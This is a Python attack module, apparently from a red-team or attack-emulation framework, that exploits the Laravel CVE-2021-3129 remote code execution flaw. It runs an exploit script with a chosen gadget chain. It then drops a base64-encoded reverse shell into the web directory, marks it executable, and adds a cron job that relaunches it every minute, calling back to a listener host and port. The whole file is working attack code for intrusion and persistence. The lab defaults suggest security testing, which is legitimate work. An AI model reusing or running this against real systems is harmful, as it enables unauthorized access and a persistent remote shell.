import base64
import os

from attacks import AttackInfo
from attacks.exp_attack_options import RCEEXPAttackOptions, RCEEXPAttack


class LaravelRCEAttackOptions(RCEEXPAttackOptions):
    webdir: str = "Web Directory to upload file"
    gadget_chain: str = "Laravel RCE Exploit Gadget Chain [Laravel/RCE1, (Laravel/RCE2), Laravel/RCE3, Laravel/RCE4, Monolog/RCE1, Monolog/RCE2]"

    def _set_defaults(self) -> None:
        super()._set_defaults()
        self.lhost = "172.18.0.3"
        self.lport = "4444"
        self.url = "http://172.18.0.2/laravel/"
        self.exp = "/root/laravel-exp/exp.py"
        self.webdir = "/var/www/html"
        self.gadget_chain = "Laravel/RCE2"


class LaravelRCEAttack(RCEEXPAttack):
    info: AttackInfo = AttackInfo(
        name="exp_laravel_rce",
        description="Exploit laravel CVE-2021-3129 RCE vulnerability",
    )
    options_class = LaravelRCEAttackOptions
    
    def _format(self, command):
        return f"python3 {os.path.basename(self.options.exp)} {self.options.url} {command} {self.options.gadget_chain}"

    def run(self) -> None:
        target_file = f"{self.options.webdir}/laravel.sh"
        self.connect_to_target()
        with self.check_printed(f"{target_file}"):
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell(self.commands)

    def _append_command(self):
        target_file = f"{self.options.webdir}/laravel.sh"
        base64_reverse_shell = self._generate_base64_reverse_shell()
        cron_command = self._add_cron_task(f"* * * * * /bin/bash {target_file}")
        directory = os.path.dirname(self.options.exp)
        self.commands.append(f"cd {directory}")
        commands = [
            "id",
            '"ip addr"',
            f'"echo {base64_reverse_shell}|base64 -d > {target_file} && chmod +x {target_file}"',
            f'"{cron_command}"',
            '"crontab -l"'
        ]
        self.commands.extend([self._format(command) for command in commands])
